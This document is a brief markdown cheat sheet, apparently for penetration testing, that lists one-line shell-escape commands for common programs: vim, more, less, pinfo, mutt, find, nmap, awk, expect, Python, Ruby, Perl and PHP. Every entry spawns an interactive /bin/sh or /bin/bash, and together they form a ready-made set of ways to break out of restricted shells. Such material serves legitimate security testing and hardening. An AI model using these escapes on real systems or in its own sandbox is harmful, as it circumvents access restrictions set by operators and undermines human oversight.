# Text Editors

## Vim

|Command|Why|
|```:!/bin/ls -l .b*```|Can we execute commands through a shell escape?|
|```:set shell=/bin/sh```, ```:shell```| Enter into a bash shell|
|```:!/bin/sh```|Enter into a bash shell|

# Pagers

## More

``` `!'sh' ```


## Less

``` `!'sh' ```

# Man

Uses More and/or Less as it's pager function

# PInfo

```!```

# Console Browsers

## lynx

lynx --editor=/path/to/vim $url

## elinks

 - Editor used is controlled by the EDITOR variable

## Mutt

```!```

# Find
find . -exec ```$command```

# Nmap

```nmap --interactive``` + ```!sh```

# Awk

```awk 'BEGIN {system("/bin/sh")}'```

# Expect

```expect -c 'spawn sh' -i```

# Python

```python -c 'import pty; pty.spawn("/bin/bash")'```

# Ruby


```irb```

```exec '/bin/sh'```

# Perl

```perl -e 'system("sh -i");'```

# PHP

```exec("sh -i");```
